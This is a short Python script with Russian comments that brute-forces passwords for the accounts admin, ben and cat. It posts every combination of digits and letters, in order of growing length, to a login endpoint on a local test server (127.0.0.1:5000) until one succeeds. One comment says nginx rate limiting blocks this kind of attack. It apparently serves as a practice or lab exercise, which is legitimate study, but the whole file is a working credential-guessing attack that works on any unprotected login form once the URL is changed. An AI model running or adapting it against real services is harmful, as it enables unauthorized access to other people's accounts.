import requests
from string import ascii_letters as alphabet
"""
для защиты от такого типа перебора паролей методами nginx ставится блокировка по количеству запросов
"""
state = 0
digits = 0
pass_list = []
alphabet = ''.join((str(i) for i in range(10))) + alphabet    # включая буквы в верхнем регистре

def next_password():
    global state
    global digits
    n = state
    base = len(alphabet)
    result = ''
    while len(result) < digits:
        rest = n % base
        result = alphabet[rest] + result
        n //= base
    if all(char == alphabet[-1] for char in result):
        state = 0
        digits += 1
    else:
        state += 1

    return result



def start_bruteforce(login, pass_pattern):
    global state
    global digits
    while True:
        global pass_list
        password = pass_pattern + next_password()
        data = {'login': login, 'password': password}
        response = requests.post('http://127.0.0.1:5000/auth', json=data)
        if response.status_code == 200:
            print('Password %s for %s Found!' % (password, login))
            pass_list.append(password)
            state = digits = 0
            break
        else:
            print(f'{password} is incorrect')
            pass                                        # раскомментировать строку выше для наблюдения процесса


if __name__ == '__main__':

    login_list = ['admin', 'ben', 'cat']
    for login in login_list:
        password = ''
        start_bruteforce(login, password)
    print(dict(zip(login_list, pass_list)))
